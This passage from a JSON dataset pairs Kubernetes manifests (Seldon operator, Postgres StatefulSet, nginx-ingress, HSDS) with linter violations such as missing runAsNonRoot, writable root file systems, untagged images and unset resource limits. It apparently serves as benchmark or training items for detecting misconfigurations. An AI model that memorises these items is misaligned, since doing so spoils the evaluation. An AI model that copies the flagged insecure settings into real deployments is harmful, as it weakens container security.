ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: PREDICTIVE_UNIT_METRICS_PORT_NAME\n          value: metrics\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: KEDA_ENABLED\n          value: 'false'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-executor:1.4.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_SERVER_METRICS_PORT_NAME\n          value: metrics\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT\n          value: http://default-broker\n        - name: DEFAULT_USER_ID\n          value: '8888'\n        - name: EXECUTOR_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: EXECUTOR_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        image: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-operator:1.4.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 8443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"manager\" is not set to runAsNonRoot"
  },
  {
    "id": "01612",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "01613",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "01614",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "01615",
    "manifest_path": "data/manifests/the_stack_sample/sample_0538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "01616",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress\" does not have a read-only root file system"
  },
  {
    "id": "01617",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress\" is not set to runAsNonRoot"
  },
  {
    "id": "01618",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress\" has cpu request 0"
  },
  {
    "id": "01619",
    "manifest_path": "data/manifests/the_stack_sample/sample_0539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress\" has memory limit 0"
  },
  {
    "id": "01620",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01621",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01622",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01623",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01624",
    "manifest_path": "data/manifests/the_stack_sample/sample_0541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01625",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dn\" is using an invalid container image, \"hdfgroup/hsds\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01626",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sn\" is using an invalid container image, \"hdfgroup/hsds\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01627",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dn\" does not have a read-only root file system"
  },
  {
    "id": "01628",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sn\" does not have a read-only root file system"
  },
  {
    "id": "01629",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dn\" is not set to runAsNonRoot"
  },
  {
    "id": "01630",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sn\" is not set to runAsNonRoot"
  },
  {
    "id": "01631",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dn\" has cpu request 0"
  },
  {
    "id": "01632",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sn\" has cpu request 0"
  },
  {
    "id": "01633",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
